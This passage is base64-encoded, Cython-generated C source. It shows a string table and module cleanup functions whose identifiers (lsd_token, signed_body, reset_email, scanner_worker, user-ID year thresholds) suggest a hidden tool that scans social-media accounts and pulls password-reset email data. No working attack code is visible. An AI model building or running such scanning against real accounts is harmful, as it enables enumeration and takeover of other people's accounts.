5eF9uX3VfaXNfcHJpdmF0ZSBfX3B5eF9zdHJpbmdfdGFiWzMxOV1cbiNkZWZpbmUgX19weXhfbl91X2lzX3ZlcmlmaWVkIF9fcHl4X3N0cmluZ190YWJbMzIwXVxuI2RlZmluZSBfX3B5eF9uX3VfaXRlbXMgX19weXhfc3RyaW5nX3RhYlszMjFdXG4jZGVmaW5lIF9fcHl4X25fdV9qc29uIF9fcHl4X3N0cmluZ190YWJbMzIyXVxuI2RlZmluZSBfX3B5eF9uX3VfayBfX3B5eF9zdHJpbmdfdGFiWzMyM11cbiNkZWZpbmUgX19weXhfbl91X2tleSBfX3B5eF9zdHJpbmdfdGFiWzMyNF1cbiNkZWZpbmUgX19weXhfbl91X2t3YXJncyBfX3B5eF9zdHJpbmdfdGFiWzMyNV1cbiNkZWZpbmUgX19weXhfbl91X2xvY2sgX19weXhfc3RyaW5nX3RhYlszMjZdXG4jZGVmaW5lIF9fcHl4X25fdV9sb2dvIF9fcHl4X3N0cmluZ190YWJbMzI3XVxuI2RlZmluZSBfX3B5eF9uX3VfbHNkIF9fcHl4X3N0cmluZ190YWJbMzI4XVxuI2RlZmluZSBfX3B5eF9uX3VfbHNkX3Rva2VuIF9fcHl4X3N0cmluZ190YWJbMzI5XVxuI2RlZmluZSBfX3B5eF9uX3VfbWFpbiBfX3B5eF9zdHJpbmdfdGFiWzMzMF1cbiNkZWZpbmUgX19weXhfbl91X21hdGNoIF9fcHl4X3N0cmluZ190YWJbMzMxXVxuI2RlZmluZSBfX3B5eF9uX3VfbWF4X3dvcmtlcnMgX19weXhfc3RyaW5nX3RhYlszMzJdXG4jZGVmaW5lIF9fcHl4X25fdV9tZDUgX19weXhfc3RyaW5nX3RhYlszMzNdXG4jZGVmaW5lIF9fcHl4X25fdV9tZWRpYV9jb3VudCBfX3B5eF9zdHJpbmdfdGFiWzMzNF1cbiNkZWZpbmUgX19weXhfbl91X21ldGEgX19weXhfc3RyaW5nX3RhYlszMzVdXG4jZGVmaW5lIF9fcHl4X25fdV9tZXRhY2xhc3MgX19weXhfc3RyaW5nX3RhYlszMzZdXG4jZGVmaW5lIF9fcHl4X25fdV9tb2RlbF9udW1iZXIgX19weXhfc3RyaW5nX3RhYlszMzddXG4jZGVmaW5lIF9fcHl4X25fdV9tb2R1bGUgX19weXhfc3RyaW5nX3RhYlszMzhdXG4jZGVmaW5lIF9fcHl4X25fdV9uMSBfX3B5eF9zdHJpbmdfdGFiWzMzOV1cbiNkZWZpbmUgX19weXhfbl91X24yIF9fcHl4X3N0cmluZ190YWJbMzQwXVxuI2RlZmluZSBfX3B5eF9uX3VfbmFtZSBfX3B5eF9zdHJpbmdfdGFiWzM0MV1cbiNkZWZpbmUgX19weXhfbl91X25hbWVfMiBfX3B5eF9zdHJpbmdfdGFiWzM0Ml1cbiNkZWZpbmUgX19weXhfbl91X25leHQgX19weXhfc3RyaW5nX3RhYlszNDNdXG4jZGVmaW5lIF9fcHl4X25fdV9udCBfX3B5eF9zdHJpbmdfdGFiWzM0NF1cbiNkZWZpbmUgX19weXhfbl91X28gX19weXhfc3RyaW5nX3RhYlszNDVdXG4jZGVmaW5lIF9fcHl4X25fdV9vayBfX3B5eF9zdHJpbmdfdGFiWzM0Nl1cbiNkZWZpbmUgX19weXhfbl91X29wZW4gX19weXhfc3RyaW5nX3RhYlszNDddXG4jZGVmaW5lIF9fcHl4X25fdV9vcmlnaW4gX19weXhfc3RyaW5nX3RhYlszNDhdXG4jZGVmaW5lIF9fcHl4X25fdV9vcmlnaW5hbF9lbWFpbCBfX3B5eF9zdHJpbmdfdGFiWzM0OV1cbiNkZWZpbmUgX19weXhfbl91X29yaWdpbmFsX2V4aXQgX19weXhfc3RyaW5nX3RhYlszNTBdXG4jZGVmaW5lIF9fcHl4X25fdV9vcyBfX3B5eF9zdHJpbmdfdGFiWzM1MV1cbiNkZWZpbmUgX19weXhfbl91X3BhcmFtcyBfX3B5eF9zdHJpbmdfdGFiWzM1Ml1cbiNkZWZpbmUgX19weXhfbl91X3BheWxvYWQgX19weXhfc3RyaW5nX3RhYlszNTNdXG4jZGVmaW5lIF9fcHl4X25fdV9wayBfX3B5eF9zdHJpbmdfdGFiWzM1NF1cbiNkZWZpbmUgX19weXhfbl91X3BvcCBfX3B5eF9zdHJpbmdfdGFiWzM1NV1cbiNkZWZpbmUgX19weXhfbl91X3Bvc3QgX19weXhfc3RyaW5nX3RhYlszNTZdXG4jZGVmaW5lIF9fcHl4X25fdV9wcCBfX3B5eF9zdHJpbmdfdGFiWzM1N11cbiNkZWZpbmUgX19weXhfbl91X3ByZXBhcmUgX19weXhfc3RyaW5nX3RhYlszNThdXG4jZGVmaW5lIF9fcHl4X25fdV9wcmludCBfX3B5eF9zdHJpbmdfdGFiWzM1OV1cbiNkZWZpbmUgX19weXhfbl91X3ByaW9yaXR5IF9fcHl4X3N0cmluZ190YWJbMzYwXVxuI2RlZmluZSBfX3B5eF9uX3VfcHl0eiBfX3B5eF9zdHJpbmdfdGFiWzM2MV1cbiNkZWZpbmUgX19weXhfbl91X3F1YWxuYW1lIF9fcHl4X3N0cmluZ190YWJbMzYyXVxuI2RlZmluZSBfX3B5eF9uX3VfcXVlcnkgX19weXhfc3RyaW5nX3RhYlszNjNdXG4jZGVmaW5lIF9fcHl4X25fdV9yIF9fcHl4X3N0cmluZ190YWJbMzY0XVxuI2RlZmluZSBfX3B5eF9uX3VfcmFuZGludCBfX3B5eF9zdHJpbmdfdGFiWzM2NV1cbiNkZWZpbmUgX19weXhfbl91X3JhbmRvbSBfX3B5eF9zdHJpbmdfdGFiWzM2Nl1cbiNkZWZpbmUgX19weXhfbl91X3JhbmRyYW5nZSBfX3B5eF9zdHJpbmdfdGFiWzM2N11cbiNkZWZpbmUgX19weXhfbl91X3JlIF9fcHl4X3N0cmluZ190YWJbMzY4XVxuI2RlZmluZSBfX3B5eF9uX3VfcmVhZCBfX3B5eF9zdHJpbmdfdGFiWzM2OV1cbiNkZWZpbmUgX19weXhfbl91X3JlZCBfX3B5eF9zdHJpbmdfdGFiWzM3MF1cbiNkZWZpbmUgX19weXhfbl91X3JlZmVyZXIgX19weXhfc3RyaW5nX3RhYlszNzFdXG4jZGVmaW5lIF9fcHl4X25fdV9yZW5kZXIgX19weXhfc3RyaW5nX3RhYlszNzJdXG4jZGVmaW5lIF9fcHl4X25fdV9yZXBseV9tYXJrdXAgX19weXhfc3RyaW5nX3RhYlszNzNdXG4jZGVmaW5lIF9fcHl4X25fdV9yZXF1ZXN0cyBfX3B5eF9zdHJpbmdfdGFiWzM3NF1cbiNkZWZpbmUgX19weXhfbl91X3JlczEgX19weXhfc3RyaW5nX3RhYlszNzVdXG4jZGVmaW5lIF9fcHl4X25fdV9yZXNldF9lbWFpbCBfX3B5eF9zdHJpbmdfdGFiWzM3Nl1cbiNkZWZpbmUgX19weXhfbl91X3Jlc29sdXRpb24gX19weXhfc3RyaW5nX3RhYlszNzddXG4jZGVmaW5lIF9fcHl4X25fdV9yZXNwb25zZSBfX3B5eF9zdHJpbmdfdGFiWzM3OF1cbiNkZWZpbmUgX19weXhfbl91X3Jlc3QgX19weXhfc3RyaW5nX3RhYlszNzldXG4jZGVmaW5lIF9fcHl4X25fdV9yciBfX3B5eF9zdHJpbmdfdGFiWzM4MF1cbiNkZWZpbmUgX19weXhfbl91X3J1biBfX3B5eF9zdHJpbmdfdGFiWzM4MV1cbiNkZWZpbmUgX19weXhfbl91X3J1bm5pbmcgX19weXhfc3RyaW5nX3RhYlszODJdXG4jZGVmaW5lIF9fcHl4X25fdV9zY2FubmVyIF9fcHl4X3N0cmluZ190YWJbMzgzXVxuI2RlZmluZSBfX3B5eF9uX3Vfc2Nhbm5lcl93b3JrZXIgX19weXhfc3RyaW5nX3RhYlszODRdXG4jZGVmaW5lIF9fcHl4X25fdV9zZWFyY2ggX19weXhfc3RyaW5nX3RhYlszODVdXG4jZGVmaW5lIF9fcHl4X25fdV9zZWxmIF9fcHl4X3N0cmluZ190YWJbMzg2XVxuI2RlZmluZSBfX3B5eF9uX3Vfc2VuZCBfX3B5eF9zdHJpbmdfdGFiWzM4N11cbiNkZWZpbmUgX19weXhfbl91X3NlcnZlcl90aW1lc3RhbXBzIF9fcHl4X3N0cmluZ190YWJbMzg4XVxuI2RlZmluZSBfX3B5eF9uX3Vfc2V0X2FjdGl2ZV90aHJlYWRzIF9fcHl4X3N0cmluZ190YWJbMzg5XVxuI2RlZmluZSBfX3B5eF9uX3Vfc2V0X25hbWUgX19weXhfc3RyaW5nX3RhYlszOTBdXG4jZGVmaW5lIF9fcHl4X25fdV9zZXRkZWZhdWx0IF9fcHl4X3N0cmluZ190YWJbMzkxXVxuI2RlZmluZSBfX3B5eF9uX3Vfc2h1dGRvd24gX19weXhfc3RyaW5nX3RhYlszOTJdXG4jZGVmaW5lIF9fcHl4X25fdV9zaWduZWRfYm9keSBfX3B5eF9zdHJpbmdfdGFiWzM5M11cbiNkZWZpbmUgX19weXhfbl91X3NsZWVwIF9fcHl4X3N0cmluZ190YWJbMzk0XVxuI2RlZmluZSBfX3B5eF9uX3Vfc3BhY2UgX19weXhfc3RyaW5nX3RhYlszOTVdXG4jZGVmaW5lIF9fcHl4X25fdV9zcGxpdCBfX3B5eF9zdHJpbmdfdGFiWzM5Nl1cbiNkZWZpbmUgX19weXhfbl91X3NwbGl0bGluZXMgX19weXhfc3RyaW5nX3RhYlszOTddXG4jZGVmaW5lIF9fcHl4X25fdV9zcyBfX3B5eF9zdHJpbmdfdGFiWzM5OF1cbiNkZWZpbmUgX19weXhfbl91X3N0YXJ0IF9fcHl4X3N0cmluZ190YWJbMzk5XVxuI2RlZmluZSBfX3B5eF9uX3Vfc3RhdHVzX2NvZGUgX19weXhfc3RyaW5nX3RhYls0MDBdXG4jZGVmaW5lIF9fcHl4X25fdV9zdHJpbmcgX19weXhfc3RyaW5nX3RhYls0MDFdXG4jZGVmaW5lIF9fcHl4X25fdV9zdWJtaXQgX19weXhfc3RyaW5nX3RhYls0MDJdXG4jZGVmaW5lIF9fcHl4X25fdV9zdW0gX19weXhfc3RyaW5nX3RhYls0MDNdXG4jZGVmaW5lIF9fcHl4X25fdV9zeXMgX19weXhfc3RyaW5nX3RhYls0MDRdXG4jZGVmaW5lIF9fcHl4X25fdV9zeXN0ZW0gX19weXhfc3RyaW5nX3RhYls0MDVdXG4jZGVmaW5lIF9fcHl4X25fdV90ZXN0IF9fcHl4X3N0cmluZ190YWJbNDA2XVxuI2RlZmluZSBfX3B5eF9uX3VfdGV4dCBfX3B5eF9zdHJpbmdfdGFiWzQwN11cbiNkZWZpbmUgX19weXhfbl91X3RocmVhZGluZyBfX3B5eF9zdHJpbmdfdGFiWzQwOF1cbiNkZWZpbmUgX19weXhfbl91X3Rocm93IF9fcHl4X3N0cmluZ190YWJbNDA5XVxuI2RlZmluZSBfX3B5eF9uX3VfdGltZSBfX3B5eF9zdHJpbmdfdGFiWzQxMF1cbiNkZWZpbmUgX19weXhfbl91X3RpbWVvdXQgX19weXhfc3RyaW5nX3RhYls0MTFdXG4jZGVmaW5lIF9fcHl4X25fdV90bCBfX3B5eF9zdHJpbmdfdGFiWzQxMl1cbiNkZWZpbmUgX19weXhfbl91X3RsX21hdGNoIF9fcHl4X3N0cmluZ190YWJbNDEzXVxuI2RlZmluZSBfX3B5eF9uX3VfdGxsIF9fcHl4X3N0cmluZ190YWJbNDE0XVxuI2RlZmluZSBfX3B5eF9uX3VfdG9rIF9fcHl4X3N0cmluZ190YWJbNDE1XVxuI2RlZmluZSBfX3B5eF9uX3VfdG9rZW4gX19weXhfc3RyaW5nX3RhYls0MTZdXG4jZGVmaW5lIF9fcHl4X25fdV90b3RhbCBfX3B5eF9zdHJpbmdfdGFiWzQxN11cbiNkZWZpbmUgX19weXhfbl91X3RydWUgX19weXhfc3RyaW5nX3RhYls0MThdXG4jZGVmaW5lIF9fcHl4X25fdV90dCBfX3B5eF9zdHJpbmdfdGFiWzQxOV1cbiNkZWZpbmUgX19weXhfbl91X3VhIF9fcHl4X3N0cmluZ190YWJbNDIwXVxuI2RlZmluZSBfX3B5eF9uX3VfdWlkIF9fcHl4X3N0cmluZ190YWJbNDIxXVxuI2RlZmluZSBfX3B5eF9uX3VfdW5rbm93biBfX3B5eF9zdHJpbmdfdGFiWzQyMl1cbiNkZWZpbmUgX19weXhfbl91X3VybCBfX3B5eF9zdHJpbmdfdGFiWzQyM11cbiNkZWZpbmUgX19weXhfbl91X3VzZXIgX19weXhfc3RyaW5nX3RhYls0MjRdXG4jZGVmaW5lIF9fcHl4X25fdV91c2VySUQgX19weXhfc3RyaW5nX3RhYls0MjVdXG4jZGVmaW5lIF9fcHl4X25fdV91c2VyX2FnZW50XzIgX19weXhfc3RyaW5nX3RhYls0MjZdXG4jZGVmaW5lIF9fcHl4X25fdV91c2VyX2lkIF9fcHl4X3N0cmluZ190YWJbNDI3XVxuI2RlZmluZSBfX3B5eF9uX3VfdXNlcl9pbmZvIF9fcHl4X3N0cmluZ190YWJbNDI4XVxuI2RlZmluZSBfX3B5eF9uX3VfdXNlcm5hbWUgX19weXhfc3RyaW5nX3RhYls0MjldXG4jZGVmaW5lIF9fcHl4X25fdV91dWkgX19weXhfc3RyaW5nX3RhYls0MzBdXG4jZGVmaW5lIF9fcHl4X25fdV91dWlkIF9fcHl4X3N0cmluZ190YWJbNDMxXVxuI2RlZmluZSBfX3B5eF9uX3VfdXVpZDQgX19weXhfc3RyaW5nX3RhYls0MzJdXG4jZGVmaW5lIF9fcHl4X25fdV92YWx1ZSBfX3B5eF9zdHJpbmdfdGFiWzQzM11cbiNkZWZpbmUgX19weXhfbl91X3ZhbHVlcyBfX3B5eF9zdHJpbmdfdGFiWzQzNF1cbiNkZWZpbmUgX19weXhfbl91X3ZhcmlhYmxlcyBfX3B5eF9zdHJpbmdfdGFiWzQzNV1cbiNkZWZpbmUgX19weXhfbl91X3cgX19weXhfc3RyaW5nX3RhYls0MzZdXG4jZGVmaW5lIF9fcHl4X25fdV93YWl0IF9fcHl4X3N0cmluZ190YWJbNDM3XVxuI2RlZmluZSBfX3B5eF9uX3Vfd2ViYnJvd3NlciBfX3B5eF9zdHJpbmdfdGFiWzQzOF1cbiNkZWZpbmUgX19weXhfbl91X3dpZCBfX3B5eF9zdHJpbmdfdGFiWzQzOV1cbiNkZWZpbmUgX19weXhfbl91X3dvcmtlcl9pZCBfX3B5eF9zdHJpbmdfdGFiWzQ0MF1cbiNkZWZpbmUgX19weXhfbl91X3dyaXRlIF9fcHl4X3N0cmluZ190YWJbNDQxXVxuI2RlZmluZSBfX3B5eF9uX3VfeCBfX3B5eF9zdHJpbmdfdGFiWzQ0Ml1cbiNkZWZpbmUgX19weXhfbl91X3l5IF9fcHl4X3N0cmluZ190YWJbNDQzXVxuI2RlZmluZSBfX3B5eF9rcF9iX2lzbzg4NTkxXzFfMiBfX3B5eF9zdHJpbmdfdGFiWzQ0NF1cbiNkZWZpbmUgX19weXhfa3BfYl9pc284ODU5MV9BIF9fcHl4X3N0cmluZ190YWJbNDQ1XVxuI2RlZmluZSBfX3B5eF9rcF9iX2lzbzg4NTkxX0FfNHhxIF9fcHl4X3N0cmluZ190YWJbNDQ2XVxuI2RlZmluZSBfX3B5eF9rcF9iX2lzbzg4NTkxX0FfNV8xXzVfMV8yVV9RX1dfN3FfVlZubnNfdF9CX0IgX19weXhfc3RyaW5nX3RhYls0NDddXG4jZGVmaW5lIF9fcHl4X2twX2JfaXNvODg1OTFfQV9BX0FfdDFDcV9GX1dDel8yUV9RZF9hX2NjZF9GX0EgX19weXhfc3RyaW5nX3RhYls0NDhdXG4jZGVmaW5lIF9fcHl4X2twX2JfaXNvODg1OTFfQV9GXzFfcV9IQV9xX2RfU18xQV8xXzFfYV9RX3FfcSBfX3B5eF9zdHJpbmdfdGFiWzQ0OV1cbiNkZWZpbmUgX19weXhfa3BfYl9pc284ODU5MV9BX0lRX0txX01fRl9BX1FfQV9hX2FfYV9ISVVfS3EgX19weXhfc3RyaW5nX3RhYls0NTBdXG4jZGVmaW5lIF9fcHl4X2twX2JfaXNvODg1OTFfQV9OX0lVX0t1QV9BUWFfMlYzal9EX0EgX19weXhfc3RyaW5nX3RhYls0NTFdXG4jZGVmaW5lIF9fcHl4X2twX2JfaXNvODg1OTFfQV9RIF9fcHl4X3N0cmluZ190YWJbNDUyXVxuI2RlZmluZSBfX3B5eF9rcF9iX2lzbzg4NTkxX0FfUV8yIF9fcHl4X3N0cmluZ190YWJbNDUzXVxuI2RlZmluZSBfX3B5eF9rcF9iX2lzbzg4NTkxX0FfUV90M2FfMUZfUWFfSEFfYl8yUWFfSEFfYl8yUWEgX19weXhfc3RyaW5nX3RhYls0NTRdXG4jZGVmaW5lIF9fcHl4X2twX2JfaXNvODg1OTFfQV9RYV9RX1FhX2xfODFBUV9RX1FhX3FfTF8xQVFfUSBfX3B5eF9zdHJpbmdfdGFiWzQ1NV1cbiNkZWZpbmUgX19weXhfa3BfYl9pc284ODU5MV9BX1FhX3JfNl9xX0ZfcV9WMV9xXzNmQV9xXzNmQV9xIF9fcHl4X3N0cmluZ190YWJbNDU2XVxuI2RlZmluZSBfX3B5eF9rcF9iX2lzbzg4NTkxX0FfYXFfWnQxSmFfNHFfYV9hX0FfMlRfQV8yVF9RXzRxIF9fcHl4X3N0cmluZ190YWJbNDU3XVxuI2RlZmluZSBfX3B5eF9rcF9iX2lzbzg4NTkxX0FfYXFfZF8xXzNhdlhRZTFfZkcxX1FfUWZIQVVfMUYgX19weXhfc3RyaW5nX3RhYls0NThdXG4jZGVmaW5lIF9fcHl4X2twX2JfaXNvODg1OTFfQV9xX1FfcV9xX2FfUV9xX2FfMV8xX0FfYV9jY2RfRiBfX3B5eF9zdHJpbmdfdGFiWzQ1OV1cbiNkZWZpbmUgX19weXhfa3BfYl9pc284ODU5MV9BX3dsX3NfNl8xRzEgX19weXhfc3RyaW5nX3RhYls0NjBdXG4jZGVmaW5lIF9fcHl4X2twX2JfaXNvODg1OTFfUSBfX3B5eF9zdHJpbmdfdGFiWzQ2MV1cbiNkZWZpbmUgX19weXhfa3BfYl9pc284ODU5MV9fMTYgX19weXhfc3RyaW5nX3RhYls0NjJdXG4jZGVmaW5lIF9fcHl4X2twX2JfaXNvODg1OTFfZkFRIF9fcHl4X3N0cmluZ190YWJbNDYzXVxuI2RlZmluZSBfX3B5eF9pbnRfMCBfX3B5eF9udW1iZXJfdGFiWzBdXG4jZGVmaW5lIF9fcHl4X2ludF8xIF9fcHl4X251bWJlcl90YWJbMV1cbiNkZWZpbmUgX19weXhfaW50XzIgX19weXhfbnVtYmVyX3RhYlsyXVxuI2RlZmluZSBfX3B5eF9pbnRfMyBfX3B5eF9udW1iZXJfdGFiWzNdXG4jZGVmaW5lIF9fcHl4X2ludF82IF9fcHl4X251bWJlcl90YWJbNF1cbiNkZWZpbmUgX19weXhfaW50XzkgX19weXhfbnVtYmVyX3RhYls1XVxuI2RlZmluZSBfX3B5eF9pbnRfMTAgX19weXhfbnVtYmVyX3RhYls2XVxuI2RlZmluZSBfX3B5eF9pbnRfMTUgX19weXhfbnVtYmVyX3RhYls3XVxuI2RlZmluZSBfX3B5eF9pbnRfMTYgX19weXhfbnVtYmVyX3RhYls4XVxuI2RlZmluZSBfX3B5eF9pbnRfMzAgX19weXhfbnVtYmVyX3RhYls5XVxuI2RlZmluZSBfX3B5eF9pbnRfMzIgX19weXhfbnVtYmVyX3RhYlsxMF1cbiNkZWZpbmUgX19weXhfaW50XzEwMCBfX3B5eF9udW1iZXJfdGFiWzExXVxuI2RlZmluZSBfX3B5eF9pbnRfMTExIF9fcHl4X251bWJlcl90YWJbMTJdXG4jZGVmaW5lIF9fcHl4X2ludF8xNTAgX19weXhfbnVtYmVyX3RhYlsxM11cbiNkZWZpbmUgX19weXhfaW50XzIwMCBfX3B5eF9udW1iZXJfdGFiWzE0XVxuI2RlZmluZSBfX3B5eF9pbnRfOTk5IF9fcHl4X251bWJlcl90YWJbMTVdXG4jZGVmaW5lIF9fcHl4X2ludF8xMzAwIF9fcHl4X251bWJlcl90YWJbMTZdXG4jZGVmaW5lIF9fcHl4X2ludF8yMDAwIF9fcHl4X251bWJlcl90YWJbMTddXG4jZGVmaW5lIF9fcHl4X2ludF8yMDEwIF9fcHl4X251bWJlcl90YWJbMThdXG4jZGVmaW5lIF9fcHl4X2ludF8yMDExIF9fcHl4X251bWJlcl90YWJbMTldXG4jZGVmaW5lIF9fcHl4X2ludF8yMDEyIF9fcHl4X251bWJlcl90YWJbMjBdXG4jZGVmaW5lIF9fcHl4X2ludF8yMDEzIF9fcHl4X251bWJlcl90YWJbMjFdXG4jZGVmaW5lIF9fcHl4X2ludF8yMDE0IF9fcHl4X251bWJlcl90YWJbMjJdXG4jZGVmaW5lIF9fcHl4X2ludF8yMDE1IF9fcHl4X251bWJlcl90YWJbMjNdXG4jZGVmaW5lIF9fcHl4X2ludF8yMDE2IF9fcHl4X251bWJlcl90YWJbMjRdXG4jZGVmaW5lIF9fcHl4X2ludF8yMDE3IF9fcHl4X251bWJlcl90YWJbMjVdXG4jZGVmaW5lIF9fcHl4X2ludF8yMDE4IF9fcHl4X251bWJlcl90YWJbMjZdXG4jZGVmaW5lIF9fcHl4X2ludF8yMDE5IF9fcHl4X251bWJlcl90YWJbMjddXG4jZGVmaW5lIF9fcHl4X2ludF8xMjc5MDAwIF9fcHl4X251bWJlcl90YWJbMjhdXG4jZGVmaW5lIF9fcHl4X2ludF8xMjc5MDAxIF9fcHl4X251bWJlcl90YWJbMjldXG4jZGVmaW5lIF9fcHl4X2ludF8xNzc1MDAwMCBfX3B5eF9udW1iZXJfdGFiWzMwXVxuI2RlZmluZSBfX3B5eF9pbnRfMTc3NTAwMDEgX19weXhfbnVtYmVyX3RhYlszMV1cbiNkZWZpbmUgX19weXhfaW50XzI3OTc2MDAwMCBfX3B5eF9udW1iZXJfdGFiWzMyXVxuI2RlZmluZSBfX3B5eF9pbnRfMjc5NzYwMDAxIF9fcHl4X251bWJlcl90YWJbMzNdXG4jZGVmaW5lIF9fcHl4X2ludF85MDA5OTAwMDAgX19weXhfbnVtYmVyX3RhYlszNF1cbiNkZWZpbmUgX19weXhfaW50XzkwMDk5MDAwMSBfX3B5eF9udW1iZXJfdGFiWzM1XVxuI2RlZmluZSBfX3B5eF9pbnRfMTYyOTAxMDAwMCBfX3B5eF9udW1iZXJfdGFiWzM2XVxuI2RlZmluZSBfX3B5eF9pbnRfMTkwMDAwMDAwMCBfX3B5eF9udW1iZXJfdGFiWzM3XVxuI2RlZmluZSBfX3B5eF9pbnRfMjUwMDAwMDAwMCBfX3B5eF9udW1iZXJfdGFiWzM4XVxuI2RlZmluZSBfX3B5eF9pbnRfMzcxMzY2ODc4NiBfX3B5eF9udW1iZXJfdGFiWzM5XVxuI2RlZmluZSBfX3B5eF9pbnRfNTY5OTc4NTIxNyBfX3B5eF9udW1iZXJfdGFiWzQwXVxuI2RlZmluZSBfX3B5eF9pbnRfODUwNzk0MDYzNCBfX3B5eF9udW1iZXJfdGFiWzQxXVxuI2RlZmluZSBfX3B5eF9pbnRfMjEyNTQwMjk4MzQgX19weXhfbnVtYmVyX3RhYls0Ml1cblxuI2lmIENZVEhPTl9VU0VfTU9EVUxFX1NUQVRFXG5zdGF0aWMgQ1lUSE9OX1NNQUxMX0NPREUgaW50IF9fcHl4X21fY2xlYXIoUHlPYmplY3QgKm0pIHtcbiAgX19weXhfbXN0YXRldHlwZSAqY2xlYXJfbW9kdWxlX3N0YXRlID0gX19QeXhfUHlNb2R1bGVfR2V0U3RhdGUobSk7XG4gIGlmICghY2xlYXJfbW9kdWxlX3N0YXRlKSByZXR1cm4gMDtcbiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9kKTtcbiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9iKTtcbiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9jeXRob25fcnVudGltZSk7XG4gIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfZW1wdHlfdHVwbGUpO1xuICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2VtcHR5X2J5dGVzKTtcbiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9lbXB0eV91bmljb2RlKTtcbiAgI2lmIENZVEhPTl9QRVA0ODlfTVVMVElfUEhBU0VfSU5JVFxuICBfX1B5eF9TdGF0ZV9SZW1vdmVNb2R1bGUoTlVMTCk7XG4gICNlbmRpZlxuICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X3B0eXBlXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfX3RsbCk7XG4gIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfdHlwZV8ydHRfX19weXhfc2NvcGVfc3RydWN0X190bGwpO1xuICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X3B0eXBlXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByKTtcbiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF90eXBlXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfMV9nZW5leHByKTtcbiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9wdHlwZV8ydHRfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcik7XG4gIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfdHlwZV8ydHRfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcik7XG4gIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfcHR5cGVfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIpO1xuICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X3R5cGVfMnR0X19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIpO1xuICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X3B0eXBlXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfNF9nZW5leHByKTtcbiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF90eXBlXzJ0dF9fX3B5eF9zY29wZV9zdHJ1Y3RfNF9nZW5leHByKTtcbiAgZm9yIChpbnQgaT0wOyBpPDE7ICsraSkgeyBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X3NsaWNlW2ldKTsgfVxuICBmb3IgKGludCBpPTA7IGk8MjM7ICsraSkgeyBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X3R1cGxlW2ldKTsgfVxuICBmb3IgKGludCBpPTA7IGk8MjE7ICsraSkgeyBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2NvZGVvYmpfdGFiW2ldKTsgfVxuICBmb3IgKGludCBpPTA7IGk8NDY0OyArK2kpIHsgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9zdHJpbmdfdGFiW2ldKTsgfVxuICBmb3IgKGludCBpPTA7IGk8NDM7ICsraSkgeyBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X251bWJlcl90YWJbaV0pOyB9XG5cblxuUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9Db21tb25UeXBlc01ldGFjbGFzc1R5cGUpO1xuXG5cblB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfQ3lGdW5jdGlvblR5cGUpO1xuXG5cblB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfR2VuZXJhdG9yVHlwZSk7XG5cblxucmV0dXJuIDA7XG59XG4jZW5kaWZcblxuI2lmIENZVEhPTl9VU0VfTU9EVUxFX1NUQVRFXG5zdGF0aWMgQ1lUSE9OX1NNQUxMX0NPREUgaW50IF9fcHl4X21fdHJhdmVyc2UoUHlPYmplY3QgKm0sIHZpc2l0cHJvYyB2aXNpdCwgdm9pZCAqYXJnKSB7XG4gIF9fcHl4X21zdGF0ZXR5cGUgKnRyYXZlcnNlX21vZHVsZV9zdGF0ZSA9IF9fUHl4X1B5TW9kdWxlX0dldFN0YXRlKG0pO1xuICBpZiAoIXRyYXZlcnNlX21vZHVsZV9zdGF0ZSkgcmV0dXJuIDA7XG4gIFB5X1ZJU0lUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfZCk7XG4gIFB5X1ZJU0lUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfYik7XG4gIFB5X1ZJU0lUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfY3l0aG9uX3J1bnRpbWUpO1xuICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2VtcHR5X3R1cGxlKTtcbiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9lbXB0eV9ieXRlcyk7XG4gIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0Z